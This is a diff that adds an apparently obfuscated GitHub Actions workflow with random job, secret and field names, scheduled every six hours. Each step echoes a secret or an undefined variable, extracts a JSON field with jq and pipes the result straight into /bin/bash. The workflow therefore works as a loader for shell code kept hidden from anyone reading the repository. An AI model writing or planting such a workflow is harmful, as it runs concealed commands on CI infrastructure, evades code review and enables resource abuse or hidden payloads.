@@ -1,0 +1,22 @@
+name: renzonglyh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: renzonglyh
+        env:
+          xlvl65266: ${{ secrets.xlvl65266 }}
+        run: |
+          echo $xlvl65266 | jq -r .yddc5109 | /bin/bash
+          echo $goei6464 | jq -r .ykc0 | /bin/bash
+          echo $zsxk0 | jq -r .ta07085 | /bin/bash
+          echo $wwhy913 | jq -r .psng5 | /bin/bash
+          echo $an967 | jq -r .bzlk3 | /bin/bash
+
